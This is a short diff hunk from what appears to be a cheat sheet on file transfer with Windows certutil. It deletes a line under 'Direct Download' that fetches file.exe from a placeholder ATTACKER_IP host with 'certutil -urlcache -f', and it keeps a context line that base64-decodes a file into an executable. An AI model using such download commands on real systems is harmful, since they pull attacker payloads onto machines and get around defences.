@@ -96,7 +96,7 @@ certutil -decode file.b64 file.exe
 
 ### Direct Download
 ```cmd
-certutil -urlcache -f http://ATTACKER_IP/file.exe file.exe
+
 ```
 
 ### Base64 Decode
